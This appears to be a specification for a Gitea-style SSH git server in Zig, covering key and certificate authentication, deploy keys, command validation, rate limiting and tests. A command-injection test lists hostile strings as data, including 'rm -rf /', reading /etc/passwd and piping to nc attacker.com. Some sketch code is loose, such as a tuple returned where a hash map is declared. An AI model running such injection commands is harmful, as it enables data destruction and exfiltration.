# Production-Grade SSH Server Implementation (Enhanced)

## Overview

Implement a production-ready SSH server in Zig that handles git operations over SSH protocol. The server must authenticate users via public keys AND certificates, support deploy keys, extract and validate git commands from SSH sessions, and provide enterprise-grade reliability with graceful shutdown, advanced security hardening, and comprehensive monitoring.

## Core Requirements

### 1. SSH Server Core

Create a configurable SSH server that can:
- Listen on configurable host and port with proxy protocol support
- Support configurable SSH ciphers, key exchanges, and MACs
- Generate and manage multiple SSH host keys (RSA, ECDSA, Ed25519)
- Handle graceful shutdown with connection draining
- Implement per-write and per-KB timeouts for DoS protection
- Support proxy protocol for load balancer integration

### 2. Authentication Methods

#### Public Key Authentication
- Authenticate users based on public key fingerprints from database
- Support multiple key types: User, Deploy, Principal
- Enforce minimum key sizes per algorithm
- Validate SSH username matches configured git user
- Log all authentication attempts with detailed context
- **Check user status** (is_active, prohibit_login, is_deleted) before granting access
- **Handle repository-specific access** for deploy keys

#### SSH Certificate Authentication
- Support SSH certificates signed by trusted CAs
- Validate certificate principals against allowed values
- Check certificate validity periods
- Support both user and host certificates

### 3. Key Type Support

```zig
pub const KeyType = enum(u8) {
    User = 1,      // Regular user authentication
    Deploy = 2,    // Deploy keys with repository-specific access
    Principal = 3, // Certificate principal keys
};

pub const PublicKey = struct {
    id: i64,
    owner_id: i64,
    name: []const u8,
    fingerprint: []const u8,
    content: []const u8,
    key_type: KeyType,
    mode: AccessMode,        // For deploy keys
    login_source_id: i64,
    verified: bool,
    created_unix: i64,
    updated_unix: i64,
    has_recent_activity: bool,
    has_used_since_last_activity_check: bool,
};
```

### 4. Session & Command Handling

Handle SSH sessions with advanced validation:
- Extract `SSH_ORIGINAL_COMMAND` from session environment
- Parse commands using proper shell quoting rules
- Validate git commands against allowed verbs
- Support LFS authentication commands
- Handle special commands (AGit flow, ssh_info)
- Set up environment variables (`GIT_PROTOCOL`, `GITEA_PROTO`, etc.)
- Handle session I/O streams with per-write timeouts
- Clean session termination with proper exit codes
- **Integrate with permission system** to check repository access before executing commands
- **Pass user context** to git commands for permission checking

### 5. Security Hardening

#### Key Validation
```zig
pub const KeySizeValidator = struct {
    minimum_key_sizes: std.StringHashMap(u32),
    minimum_key_size_check: bool = true,
    
    pub fn getDefaultMinimumSizes() std.StringHashMap(u32) {
        // Gitea's default minimum sizes
        return .{
            .{ "ed25519", 256 },
            .{ "ed25519-sk", 256 },
            .{ "ecdsa", 256 },
            .{ "ecdsa-sk", 256 },
            .{ "rsa", 3071 },
        };
    }
};
```

#### Advanced Security Features
- **Rate Limiting**: Prevent SSH brute force attacks with per-IP tracking
- **Connection Limits**: Enforce maximum concurrent connections
- **Timeout Management**: Per-write and per-KB timeouts
- **Input Validation**: Validate all SSH protocol inputs and git commands
- **Command Validation**: Strict validation against allowed git verbs
- **Certificate Validation**: Verify certificate chains and principals
- **Audit Logging**: Detailed authentication and command logging

### 6. Command Validation

```zig
pub const GitCommandValidator = struct {
    pub fn isAllowedVerb(verb: []const u8) bool {
        return std.mem.eql(u8, verb, "git-upload-pack") or
               std.mem.eql(u8, verb, "git-receive-pack") or
               std.mem.eql(u8, verb, "git-upload-archive") or
               std.mem.eql(u8, verb, "git-lfs-authenticate") or
               std.mem.eql(u8, verb, "git-lfs-transfer");
    }
    
    pub fn parseCommand(cmd: []const u8) !ParsedCommand {
        // Handle special commands first
        if (std.mem.eql(u8, cmd, "ssh_info")) {
            return ParsedCommand{ .special = .{ .type = "agit", .version = 1 } };
        }
        
        // Parse using shell quoting rules
        const args = try shellquote.split(cmd);
        if (args.len < 2) return error.InvalidCommand;
        
        const verb = args[0];
        if (!isAllowedVerb(verb)) {
            return error.InvalidCommand;
        }
        
        return ParsedCommand{
            .git = .{
                .verb = verb,
                .repo_path = args[1],
                .lfs_verb = if (args.len > 2) args[2] else null,
            },
        };
    }
};
```

## File Structure

```
src/ssh/
├── server.zig          // Main SSH server implementation
├── auth.zig            // Public key authentication
├── certificate.zig     // SSH certificate support
├── session.zig         // SSH session handling
├── command.zig         // Command extraction and validation
├── security.zig        // Rate limiting and security
├── host_key.zig        // Host key management
├── shutdown.zig        // Graceful shutdown handling
├── key_validator.zig   // Key size and type validation
├── deploy_key.zig      // Deploy key specific logic
└── shellquote.zig      // Shell quote parsing
```

## Implementation Guidelines

### Enhanced SSH Server Structure

```zig
pub const SshServer = struct {
    config: SshConfig,
    db: *DataAccessObject,
    listener: std.net.Server,
    shutdown_manager: ShutdownManager,
    rate_limiter: RateLimiter,
    connection_tracker: ConnectionTracker,
    host_key_manager: HostKeyManager,
    key_validator: KeySizeValidator,
    certificate_validator: CertificateValidator,
    permission_cache: PermissionCache, // Add permission cache for session context
    
    pub fn handleConnection(self: *SshServer, allocator: std.mem.Allocator, conn: std.net.Connection) !void {
        // Handle proxy protocol if enabled
        const real_addr = if (self.config.use_proxy_protocol)
            try self.parseProxyProtocol(allocator, conn)
        else
            conn.address;
            
        // Rate limit check
        if (!try self.rate_limiter.checkAllowed(real_addr)) {
            self.logConnectionFailure(real_addr, error.RateLimitExceeded);
            return error.RateLimitExceeded;
        }
        
        // Track connection
        const tracked = try self.connection_tracker.tryAdd(allocator, real_addr) orelse {
            self.logConnectionFailure(real_addr, error.TooManyConnections);
            return error.TooManyConnections;
        };
        defer self.connection_tracker.remove(tracked);
        
        // Calculate dynamic timeout
        const timeout = self.calculateWriteTimeout(0);
        try conn.setWriteTimeout(timeout);
        
        // Handle session
        var session = try SshSession.init(allocator, conn, &self.config);
        defer session.deinit();
        
        try self.handleSession(allocator, &session);
    }
    
    fn calculateWriteTimeout(self: *const SshServer, data_size_kb: u64) std.time.Duration {
        const base = std.time.ns_per_s * self.config.per_write_timeout_seconds;
        const per_kb = std.time.ns_per_ms * self.config.per_write_per_kb_timeout_ms;
        return base + (per_kb * data_size_kb);
    }
};
```

### Enhanced Authentication Flow

```zig
pub const SshAuthenticator = struct {
    db: *DataAccessObject,
    key_validator: *KeySizeValidator,
    certificate_validator: *CertificateValidator,
    
    pub fn authenticate(
        self: *SshAuthenticator,
        allocator: std.mem.Allocator,
        auth_data: AuthData,
        username: []const u8,
        remote_addr: []const u8,
    ) !AuthResult {
        // Validate username first
        if (!std.mem.eql(u8, username, self.config.builtin_server_user)) {
            self.logAuthFailure(remote_addr, username, null, .invalid_username);
            return AuthResult{ .failed = .invalid_username };
        }
        
        switch (auth_data) {
            .public_key => |key_data| {
                // Validate key size first
                try self.key_validator.validateKey(key_data);
                
                // Calculate fingerprint
                const fingerprint = try calculateSSHFingerprint(allocator, key_data);
                defer allocator.free(fingerprint);
                
                // Lookup in database
                const key = try self.db.getPublicKeyByFingerprint(allocator, fingerprint) orelse {
                    self.logAuthFailure(remote_addr, username, fingerprint, .key_not_found);
                    return AuthResult{ .failed = .key_not_found };
                };
                defer key.deinit(allocator);
                
                // Check key type specific logic
                switch (key.key_type) {
                    .User => {
                        // Verify user is active
                        const user = try self.db.getUserById(allocator, key.owner_id) orelse {
                            self.logAuthFailure(remote_addr, username, fingerprint, .user_not_found);
                            return AuthResult{ .failed = .user_not_found };
                        };
                        defer user.deinit(allocator);
                        
                        if (!user.is_active or user.prohibit_login) {
                            self.logAuthFailure(remote_addr, username, fingerprint, .user_disabled);
                            return AuthResult{ .failed = .user_disabled };
                        }
                        
                        self.logAuthSuccess(remote_addr, username, fingerprint, .User);
                        return AuthResult{ .success = .{ .user_id = key.owner_id, .key_id = key.id, .key_type = .User } };
                    },
                    .Deploy => {
                        // Deploy keys need repository ID from command for access validation
                        self.logAuthSuccess(remote_addr, username, fingerprint, .Deploy);
                        return AuthResult{ .success = .{ .user_id = key.owner_id, .key_id = key.id, .key_type = .Deploy, .mode = key.mode, .deploy_key_id = key.id } };
                    },
                    .Principal => {
                        // Principal keys require certificate
                        self.logAuthFailure(remote_addr, username, fingerprint, .principal_requires_certificate);
                        return AuthResult{ .failed = .principal_requires_certificate };
                    },
                }
            },
            .certificate => |cert_data| {
                // Validate certificate
                const cert = try self.certificate_validator.validate(allocator, cert_data) orelse {
                    self.logAuthFailure(remote_addr, username, null, .certificate_invalid);
                    return AuthResult{ .failed = .certificate_invalid };
                };
                defer cert.deinit(allocator);
                
                // Check principal
                const allowed_principal = try self.checkAllowedPrincipal(allocator, cert, username);
                if (!allowed_principal) {
                    self.logAuthFailure(remote_addr, username, cert.key_id, .principal_not_allowed);
                    return AuthResult{ .failed = .principal_not_allowed };
                }
                
                self.logAuthSuccess(remote_addr, username, cert.key_id, .Principal);
                return AuthResult{ .success = .{ .user_id = cert.user_id, .key_id = null, .key_type = .Principal } };
            },
        }
    }
    
    fn logAuthSuccess(self: *SshAuthenticator, remote_addr: []const u8, username: []const u8, fingerprint: []const u8, key_type: KeyType) void {
        switch (key_type) {
            .Deploy => std.log.info("SSH: Deploy key authentication success from {s} (fingerprint: {s})", .{ remote_addr, fingerprint }),
            .Principal => std.log.info("SSH: Principal authentication success from {s} (fingerprint: {s})", .{ remote_addr, fingerprint }),
            .User => std.log.info("SSH: User authentication success from {s} (fingerprint: {s})", .{ remote_addr, fingerprint }),
        }
    }
    
    fn logAuthFailure(self: *SshAuthenticator, remote_addr: []const u8, username: []const u8, fingerprint: ?[]const u8, reason: AuthFailureReason) void {
        switch (reason) {
            .invalid_username => {
                std.log.warn("Invalid SSH username {s} - must use {s} for all git operations via ssh", .{ username, self.config.builtin_server_user });
                std.log.warn("Failed authentication attempt from {s}", .{remote_addr});
            },
            .key_not_found => {
                std.log.warn("Unknown public key: {s} from {s}", .{ fingerprint.?, remote_addr });
                std.log.warn("Failed authentication attempt from {s}", .{remote_addr});
            },
            .certificate_invalid => {
                std.log.err("Invalid Certificate presented from {s}", .{remote_addr});
                std.log.warn("Failed authentication attempt from {s}", .{remote_addr});
            },
            else => {
                std.log.warn("Authentication failed from {s}: {}", .{ remote_addr, reason });
                std.log.warn("Failed authentication attempt from {s}", .{remote_addr});
            },
        }
    }
};
```

### Certificate Support

```zig
pub const SshCertificate = struct {
    cert_type: CertType,
    valid_principals: [][]const u8,
    signature_key: []const u8,
    key_id: []const u8,
    valid_after: i64,
    valid_before: i64,
    critical_options: std.StringHashMap([]const u8),
    extensions: std.StringHashMap([]const u8),
};

pub const CertificateValidator = struct {
    trusted_ca_keys: [][]const u8,
    allowed_principals: [][]const u8,
    
    pub fn validate(self: *CertificateValidator, allocator: std.mem.Allocator, cert_data: []const u8) !?SshCertificate {
        const cert = try parseCertificate(allocator, cert_data);
        errdefer cert.deinit(allocator);
        
        // Verify signature against trusted CAs
        var valid_ca = false;
        for (self.trusted_ca_keys) |ca_key| {
            if (try verifyCertificateSignature(cert, ca_key)) {
                valid_ca = true;
                break;
            }
        }
        if (!valid_ca) return null;
        
        // Check validity period
        const now = std.time.timestamp();
        if (now < cert.valid_after or now > cert.valid_before) {
            return null;
        }
        
        // Verify cert type
        if (cert.cert_type != .User) {
            return null;
        }
        
        return cert;
    }
};
```

## Enhanced Configuration

```zig
pub const SshConfig = struct {
    // Basic settings
    host: []const u8 = "0.0.0.0",
    port: u16 = 22,
    builtin_server_user: []const u8 = "git",
    root_path: []const u8 = "~/.ssh",
    
    // Host keys
    server_host_keys: [][]const u8 = &.{"ssh/gitea.rsa", "ssh/gogs.rsa", "ssh/ed25519", "ssh/ecdsa"},
    
    // Connection limits
    max_connections: u32 = 1000,
    max_connections_per_ip: u32 = 10,
    
    // Timeouts
    auth_timeout_seconds: u32 = 60,
    connection_timeout_seconds: u32 = 300,
    graceful_shutdown_timeout_seconds: u32 = 30,
    per_write_timeout_seconds: u32 = 30,
    per_write_per_kb_timeout_ms: u32 = 10,
    
    // Rate limiting
    rate_limit_window_seconds: u32 = 300,
    rate_limit_max_attempts: u32 = 10,
    
    // Security
    minimum_key_size_check: bool = true,
    minimum_key_sizes: ?std.StringHashMap(u32) = null, // Use defaults if null
    
    // Certificate support
    trusted_user_ca_keys: [][]const u8 = &.{},
    trusted_user_ca_keys_file: ?[]const u8 = null,
    authorized_principals_allow: [][]const u8 = &.{"username", "email"},
    authorized_principals_enabled: bool = false,
    
    // Proxy support
    use_proxy_protocol: bool = false,
    
    // Authorized keys management
    authorized_keys_backup: bool = false,
    create_authorized_keys_file: bool = true,
    expose_anonymous: bool = false,
    
    // Ciphers and algorithms
    ciphers: []const []const u8 = &.{
        "chacha20-poly1305@openssh.com",
        "aes256-gcm@openssh.com",
        "aes128-gcm@openssh.com",
        "aes256-ctr",
        "aes192-ctr",
        "aes128-ctr",
    },
    key_exchanges: []const []const u8 = &.{
        "curve25519-sha256",
        "curve25519-sha256@libssh.org",
        "ecdh-sha2-nistp256",
        "ecdh-sha2-nistp384",
        "ecdh-sha2-nistp521",
        "diffie-hellman-group14-sha256",
    },
    macs: []const []const u8 = &.{
        "umac-128-etm@openssh.com",
        "hmac-sha2-256-etm@openssh.com",
        "hmac-sha2-256",
    },
};
```

## Integration Points

### Permission System Integration
- Import and use the permission system from `src/permission.zig`
- Create a `SecurityContext` for each authenticated session
- Check repository permissions before executing git commands
- Handle deploy key permissions specially (repository-specific access)
- Pass user context through the git command execution chain

### Session Context Structure
```zig
pub const SessionContext = struct {
    user_id: i64,
    key_id: ?i64,
    key_type: KeyType,
    deploy_key_id: ?i64, // For deploy key repository access
    security_ctx: *SecurityContext,
    
    pub fn checkRepoAccess(self: *SessionContext, repo_path: []const u8, access_mode: AccessMode) !void {
        const repo_id = try self.resolveRepoPath(repo_path);
        
        // Special handling for deploy keys
        if (self.key_type == .Deploy) {
            // Verify deploy key has access to this specific repository
            if (!try self.validateDeployKeyAccess(repo_id)) {
                return error.AccessDenied;
            }
        }
        
        // Use permission system for access check
        const unit_type = if (access_mode == .Write) UnitType.Code else UnitType.Code;
        if (access_mode == .Write) {
            try self.security_ctx.requireRepoWrite(repo_id, unit_type);
        } else {
            try self.security_ctx.requireRepoRead(repo_id, unit_type);
        }
    }
};
```

## Testing Strategy

### Comprehensive Test Coverage

```zig
// Key validation tests
test "minimum key size enforcement" {
    const allocator = testing.allocator;
    var validator = KeySizeValidator.init(allocator);
    defer validator.deinit();
    
    // Test weak RSA key (2048 bits) - should fail
    const weak_rsa = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..."; // 2048-bit key
    try testing.expectError(error.KeyTooWeak, validator.validateKey(weak_rsa));
    
    // Test strong RSA key (4096 bits) - should pass
    const strong_rsa = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC..."; // 4096-bit key
    try validator.validateKey(strong_rsa);
}

// Certificate authentication tests
test "SSH certificate authentication with trusted CA" {
    const allocator = testing.allocator;
    var validator = CertificateValidator.init(allocator, trusted_ca_keys);
    defer validator.deinit();
    
    const cert_data = try generateTestCertificate(allocator, ca_key, "test-user", .User);
    defer allocator.free(cert_data);
    
    const cert = try validator.validate(allocator, cert_data);
    try testing.expect(cert != null);
}

test "SSH certificate with untrusted CA" {
    const allocator = testing.allocator;
    var validator = CertificateValidator.init(allocator, trusted_ca_keys);
    defer validator.deinit();
    
    const untrusted_ca = try generateTestKeyPair(allocator);
    const cert_data = try generateTestCertificate(allocator, untrusted_ca.private, "test-user", .User);
    defer allocator.free(cert_data);
    
    const cert = try validator.validate(allocator, cert_data);
    try testing.expect(cert == null);
}

// Deploy key tests
test "deploy key vs user key handling" {
    const allocator = testing.allocator;
    var auth = try createTestAuthenticator(allocator);
    defer auth.deinit();
    
    // Test user key
    const user_result = try auth.authenticate(allocator, .{ .public_key = user_key }, "git", "127.0.0.1");
    try testing.expect(user_result == .success);
    try testing.expect(user_result.success.key_type == .User);
    
    // Test deploy key
    const deploy_result = try auth.authenticate(allocator, .{ .public_key = deploy_key }, "git", "127.0.0.1");
    try testing.expect(deploy_result == .success);
    try testing.expect(deploy_result.success.key_type == .Deploy);
    try testing.expect(deploy_result.success.mode == .Read); // Deploy key has read-only access
}

// Command validation tests
test "git command validation and LFS support" {
    const allocator = testing.allocator;
    
    // Valid git commands
    try testing.expect(GitCommandValidator.isAllowedVerb("git-upload-pack"));
    try testing.expect(GitCommandValidator.isAllowedVerb("git-receive-pack"));
    try testing.expect(GitCommandValidator.isAllowedVerb("git-upload-archive"));
    try testing.expect(GitCommandValidator.isAllowedVerb("git-lfs-authenticate"));
    try testing.expect(GitCommandValidator.isAllowedVerb("git-lfs-transfer"));
    
    // Invalid commands
    try testing.expect(!GitCommandValidator.isAllowedVerb("rm"));
    try testing.expect(!GitCommandValidator.isAllowedVerb("cat"));
}

test "shell quote parsing edge cases" {
    const allocator = testing.allocator;
    
    // Test various quoting scenarios
    const test_cases = .{
        .{ "git-upload-pack '/repo.git'", &.{ "git-upload-pack", "/repo.git" } },
        .{ "git-receive-pack \"/repo with spaces.git\"", &.{ "git-receive-pack", "/repo with spaces.git" } },
        .{ "git-upload-pack /repo\\'s.git", &.{ "git-upload-pack", "/repo's.git" } },
        .{ "git-lfs-authenticate '/repo.git' download", &.{ "git-lfs-authenticate", "/repo.git", "download" } },
    };
    
    inline for (test_cases) |tc| {
        const parsed = try shellquote.split(allocator, tc[0]);
        defer allocator.free(parsed);
        try testing.expectEqualSlices([]const u8, tc[1], parsed);
    }
}

// Timeout tests
test "per-write timeout with large data transfer" {
    const allocator = testing.allocator;
    var server = try createTestServer(allocator);
    defer server.deinit();
    
    // Test timeout calculation
    const timeout_1mb = server.calculateWriteTimeout(1024); // 1MB
    const timeout_10mb = server.calculateWriteTimeout(10240); // 10MB
    
    try testing.expect(timeout_10mb > timeout_1mb);
    try testing.expectEqual(30 * std.time.ns_per_s + 10 * 1024 * std.time.ns_per_ms, timeout_1mb);
}

// Proxy protocol tests
test "proxy protocol header parsing" {
    const allocator = testing.allocator;
    var server = try createTestServerWithProxy(allocator);
    defer server.deinit();
    
    const proxy_header = "PROXY TCP4 192.168.1.1 10.0.0.1 56324 22\r\n";
    const real_addr = try server.parseProxyProtocol(allocator, proxy_header);
    defer allocator.free(real_addr);
    
    try testing.expectEqualStrings("192.168.1.1:56324", real_addr);
}

// Special command tests
test "AGit flow special commands" {
    const allocator = testing.allocator;
    
    const result = try GitCommandValidator.parseCommand("ssh_info");
    try testing.expect(result == .special);
    try testing.expectEqualStrings("agit", result.special.type);
    try testing.expectEqual(@as(u32, 1), result.special.version);
}

// Security tests
test "malformed SSH command injection" {
    const allocator = testing.allocator;
    
    // Test command injection attempts
    const malicious_commands = .{
        "git-upload-pack /repo.git; rm -rf /",
        "git-upload-pack /repo.git && cat /etc/passwd",
        "git-upload-pack /repo.git | nc attacker.com 1234",
        "git-upload-pack /repo.git`whoami`",
    };
    
    for (malicious_commands) |cmd| {
        const result = GitCommandValidator.parseCommand(cmd);
        // Should either error or parse safely without executing injected commands
        if (result) |parsed| {
            try testing.expect(parsed.git.repo_path[0] == '/');
            try testing.expect(std.mem.indexOf(u8, parsed.git.repo_path, ";") == null);
            try testing.expect(std.mem.indexOf(u8, parsed.git.repo_path, "&") == null);
            try testing.expect(std.mem.indexOf(u8, parsed.git.repo_path, "|") == null);
            try testing.expect(std.mem.indexOf(u8, parsed.git.repo_path, "`") == null);
        } else |err| {
            try testing.expect(err == error.InvalidCommand);
        }
    }
}

// Connection limit tests
test "concurrent connection limit enforcement" {
    const allocator = testing.allocator;
    var tracker = ConnectionTracker.init(allocator, 5); // Max 5 connections
    defer tracker.deinit();
    
    // Add 5 connections - should succeed
    var connections: [5]?Connection = undefined;
    for (&connections, 0..) |*conn, i| {
        const addr = try std.fmt.allocPrint(allocator, "192.168.1.{}", .{i});
        defer allocator.free(addr);
        conn.* = try tracker.tryAdd(allocator, addr);
        try testing.expect(conn.* != null);
    }
    
    // Try to add 6th connection - should fail
    const conn6 = try tracker.tryAdd(allocator, "192.168.1.100");
    try testing.expect(conn6 == null);
    
    // Remove one connection
    tracker.remove(connections[0].?);
    
    // Now we can add another
    const conn7 = try tracker.tryAdd(allocator, "192.168.1.101");
    try testing.expect(conn7 != null);
}

// Rate limiting tests
test "authentication failure rate limiting" {
    const allocator = testing.allocator;
    var limiter = RateLimiter.init(allocator, .{
        .window_seconds = 300,
        .max_attempts = 3,
    });
    defer limiter.deinit();
    
    const test_ip = "192.168.1.100";
    
    // First 3 attempts should succeed
    for (0..3) |_| {
        try testing.expect(try limiter.checkAllowed(test_ip));
        limiter.recordAttempt(test_ip, false); // Record failure
    }
    
    // 4th attempt should be rate limited
    try testing.expect(!try limiter.checkAllowed(test_ip));
}

// Graceful shutdown tests
test "graceful shutdown with active connections" {
    const allocator = testing.allocator;
    var server = try createTestServer(allocator);
    defer server.deinit();
    
    // Start server in background
    const thread = try std.Thread.spawn(.{}, serverThread, .{&server});
    
    // Create multiple connections
    var clients: [10]SshClient = undefined;
    for (&clients) |*client| {
        client.* = try SshClient.connect(allocator, "127.0.0.1", test_port);
    }
    
    // Request shutdown
    server.shutdown_manager.requestShutdown();
    
    // Verify no new connections accepted
    const new_client = SshClient.connect(allocator, "127.0.0.1", test_port);
    try testing.expectError(error.ConnectionRefused, new_client);
    
    // Close existing connections
    for (&clients) |*client| {
        client.close();
    }
    
    // Wait for shutdown
    thread.join();
    
    // Verify clean shutdown
    try testing.expect(server.connection_tracker.count() == 0);
}

// Permission integration tests
test "SSH session with permission checks" {
    const allocator = testing.allocator;
    var server = try createTestServer(allocator);
    defer server.deinit();
    
    // Create test user and repository
    const user_id = try createTestUser(allocator, server.db, "testuser");
    const repo_id = try createTestRepo(allocator, server.db, user_id, "test-repo", .Private);
    
    // Authenticate with user key
    var auth = SshAuthenticator{ .db = server.db, .key_validator = &server.key_validator };
    const auth_result = try auth.authenticate(allocator, .{ .public_key = test_key }, "git", "127.0.0.1");
    
    // Create session context with security
    var security_ctx = try SecurityContext.init(allocator, server.db, &server.permission_cache, auth_result.success.user_id);
    var session_ctx = SessionContext{
        .user_id = auth_result.success.user_id,
        .key_id = auth_result.success.key_id,
        .key_type = auth_result.success.key_type,
        .deploy_key_id = null,
        .security_ctx = &security_ctx,
    };
    
    // Test repository access
    try session_ctx.checkRepoAccess("/testuser/test-repo.git", .Read);
    try session_ctx.checkRepoAccess("/testuser/test-repo.git", .Write);
    
    // Test access to another user's repo fails
    const other_repo_id = try createTestRepo(allocator, server.db, 999, "other-repo", .Private);
    try testing.expectError(error.AccessDenied, session_ctx.checkRepoAccess("/other/other-repo.git", .Read));
}

test "deploy key repository-specific access" {
    const allocator = testing.allocator;
    var server = try createTestServer(allocator);
    defer server.deinit();
    
    // Create repositories
    const repo1_id = try createTestRepo(allocator, server.db, 100, "allowed-repo", .Private);
    const repo2_id = try createTestRepo(allocator, server.db, 100, "denied-repo", .Private);
    
    // Create deploy key with access to repo1 only
    const deploy_key_id = try createDeployKey(allocator, server.db, repo1_id, "deploy-key", .Read);
    
    // Authenticate with deploy key
    var auth = SshAuthenticator{ .db = server.db, .key_validator = &server.key_validator };
    const auth_result = try auth.authenticate(allocator, .{ .public_key = deploy_test_key }, "git", "127.0.0.1");
    
    // Create session context
    var session_ctx = SessionContext{
        .user_id = auth_result.success.user_id,
        .key_id = auth_result.success.key_id,
        .key_type = .Deploy,
        .deploy_key_id = auth_result.success.deploy_key_id,
        .security_ctx = undefined, // Deploy keys use different permission path
    };
    
    // Test access to allowed repo succeeds
    try session_ctx.checkRepoAccess("/owner/allowed-repo.git", .Read);
    
    // Test write access fails (deploy key is read-only)
    try testing.expectError(error.AccessDenied, session_ctx.checkRepoAccess("/owner/allowed-repo.git", .Write));
    
    // Test access to other repo fails
    try testing.expectError(error.AccessDenied, session_ctx.checkRepoAccess("/owner/denied-repo.git", .Read));
}
```

## Error Handling

Enhanced error types:

```zig
pub const SshError = error{
    // Connection errors
    ConnectionRefused,
    ConnectionTimeout,
    TooManyConnections,
    RateLimitExceeded,
    ProxyProtocolError,
    
    // Authentication errors
    AuthenticationFailed,
    KeyNotFound,
    KeyTooWeak,
    KeyTypeNotAllowed,
    UserDisabled,
    InvalidUsername,
    CertificateInvalid,
    CertificateExpired,
    PrincipalNotAllowed,
    PrincipalRequiresCertificate,
    
    // Protocol errors
    InvalidProtocol,
    InvalidCommand,
    UnsupportedCipher,
    CommandNotAllowed,
    
    // System errors
    HostKeyGenerationFailed,
    ShutdownInProgress,
    DatabaseError,
} || error{OutOfMemory};
```

## Monitoring & Observability

### Enhanced Metrics

- Active connections by type (user, deploy, certificate)
- Authentication success/failure rate by method
- Command execution times by verb
- Rate limit hits by IP
- Certificate validation failures
- Key size rejection count
- Proxy protocol errors
- Per-write timeout triggers

### Detailed Audit Logging

```zig
pub const AuditLogger = struct {
    pub fn logAuth(self: *AuditLogger, event: AuthEvent) void {
        const json = std.json.stringify(event, .{}, self.writer) catch return;
        std.log.info("SSH_AUTH: {s}", .{json});
    }
    
    pub fn logCommand(self: *AuditLogger, event: CommandEvent) void {
        const json = std.json.stringify(event, .{}, self.writer) catch return;
        std.log.info("SSH_COMMAND: {s}", .{json});
    }
};

pub const AuthEvent = struct {
    timestamp: i64,
    remote_addr: []const u8,
    username: []const u8,
    auth_method: []const u8, // "publickey", "certificate"
    key_type: ?KeyType,
    key_fingerprint: ?[]const u8,
    certificate_id: ?[]const u8,
    result: []const u8, // "success", "failed"
    failure_reason: ?[]const u8,
    user_id: ?i64,
};

pub const CommandEvent = struct {
    timestamp: i64,
    remote_addr: []const u8,
    user_id: i64,
    key_id: ?i64,
    command: []const u8,
    verb: []const u8,
    repo_path: []const u8,
    exit_code: i32,
    duration_ms: u64,
};
```

## Important Implementation Considerations

### Memory Management
- Use arena allocators for session-scoped data to simplify cleanup
- Be careful with string ownership from database queries - duplicate if needed beyond query lifetime
- Deploy key fingerprints and content need proper cleanup in defer blocks

### Error Handling Patterns
- Distinguish between authentication failures (return specific error) vs system errors (log and return generic error)
- Never expose internal details in authentication failure messages
- Log detailed errors server-side while returning generic errors to clients

### Database Integration
- SSH key lookups should be by fingerprint (indexed)
- User status checks (is_active, prohibit_login, is_deleted) are critical for security
- Deploy keys need special handling as they're repository-specific, not user-wide
- Consider caching frequently accessed data (user status, key mappings) at the session level

### Testing Approach
- Create mock DAOs for testing to avoid circular dependencies
- Test permission integration thoroughly - it's a critical security boundary
- Include tests for user status edge cases (deleted users, prohibited logins)
- Deploy key tests must verify repository-specific access restrictions

### Security Considerations
- Always validate user status after key authentication succeeds
- Deploy keys should never grant admin/owner permissions
- Repository state (archived, mirror) affects write permissions regardless of user permissions
- Rate limiting should track by IP, not by user (since auth happens after connection)

## References

- [Gitea SSH Implementation](https://github.com/go-gitea/gitea/blob/main/modules/ssh/ssh.go)
- [Gitea SSH Settings](https://github.com/go-gitea/gitea/blob/main/modules/setting/ssh.go)
- [Gitea SSH Key Verification](https://github.com/go-gitea/gitea/blob/main/models/asymkey/ssh_key_verify.go)
- [SSH Certificate Authentication](https://github.com/go-gitea/gitea/blob/main/models/asymkey/ssh_key_principals.go)
- [SSH Protocol RFC](https://www.rfc-editor.org/rfc/rfc4253)
- [OpenSSH Certificate Protocol](https://cvsweb.openbsd.org/src/usr.bin/ssh/PROTOCOL.certkeys)